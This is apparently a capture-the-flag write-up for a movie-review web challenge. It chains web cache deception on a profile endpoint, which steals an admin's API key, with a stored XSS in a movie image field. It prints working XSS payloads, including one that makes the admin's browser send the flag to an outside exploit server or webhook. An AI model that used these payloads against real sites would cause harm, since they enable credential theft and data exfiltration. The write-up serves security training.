# Popcorn and payloads

## Solution

### Recon

- Notice that all responses contain the `X-Cache-Status` HTTP header, which indicates that a **cache server** is probably in place.

- Only static file requests seem to be cached. Requests ending in `.css` or `.jpg` return responses with `HIT` or `MISS` in the `X-Cache-Status`, while any other requests return `BYPASS`.

- We should check for any [web cache deception vulnerabilitites](https://portswigger.net/web-security/web-cache-deception)

### Identify the vulnerability

- Identify a target endpoint that returns a dynamic response containing **sensitive information**. You should use the `/profile` endpoint.

- Identify a discrepancy in how the cache and backend server **parse** the URL path. There is a discrepancy in **how** they map URLs to resources.

- It seems that the backend server uses REST-style URL mapping and ignores any extra parameters. For example, `/profile/test` still returns the same response as `/profile`. 

-  Now, test if the cache server will cache the response if we add a static extension like `.css`. The cache server indeed caches the response for the request `/profile/test.css`.

- Since the response is cached, we can get the **exact same response** even if we remove the session cookie and make the same request.

### Exploit

- Craft a malicious URL like `/profile/a.css` and include it to a movie review. 

- An admin bot will visit any URLs contained in reviews.

- Wait a few seconds and then visit your own malicious URL. If you get `X-Cache-Status: MISS`, you didn't wait long enough. Try again with an other URL.

- You will be able to see the admin's cached profile page and steal their API key. Also, notice that there is API documentation available at `/api` and a functionality that returns the flag via an empty POST request to `/admin`.

- POST `/admin` with a regular user returns forbidden, so we probably need XSS on the page in order to get the flag.

- Study the API docs in `/api` and note that you can add a new movie with a POST request to `/api/movies`. Example request body:
```javascript
{
  "title": "New Movie",
  "image": "https://example.com/image.jpg",
  "trailer": "https://youtube.com/embed/xyz",
  "description": "A brand new movie."
}
```

- The image URL is inserted into the `src` attribute of the movie's `<img>` and it is not properly escaped. Therefore you can trigger XXS by adding a new movie with the following image URL:
```javascript
"image": "x\" onerror=\"alert(0)"
```

- Don't forget to use the stolen API key as an `x-api-key` HTTP header.

- Finally, add a movie with the following payload to force admin to send the flag to your exploit server:
```javascript
{
  "title": "New Movie",
  "image": "x\" onerror=\"fetch('http://CHALLENGE_ADDR/admin',{method:'POST'}).then(r=>r.json()).then(r=>fetch('http://YOUR-EXPLOIT-SERVER/?flag='+r.flag))",
  "trailer": "https://youtube.com/embed/xyz",
  "description": "A brand new movie."
}
```

Example: (change `http://127.0.0.1/` depending on the platform, the key based on instance, the webhook with yours)
```javascript
fetch("/api/movies", {
  "headers": {
    "content-type": "application/json",
    "x-api-key": '9ac17031fe76d57c0877824c9a453d52'
  },
  "body": JSON.stringify({
  "title": "New Movie",
  "image": "x\" onerror=\"fetch('http://127.0.0.1/admin',{method:'POST'}).then(r=>r.json()).then(r=>fetch('https://webhook.site/2847a8ad-9c63-4e29-b943-dd5fbb6df0f1/?flag='+r.flag))",
  "trailer": "https://youtube.com/embed/xyz",
  "description": "A brand new movie."
}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```
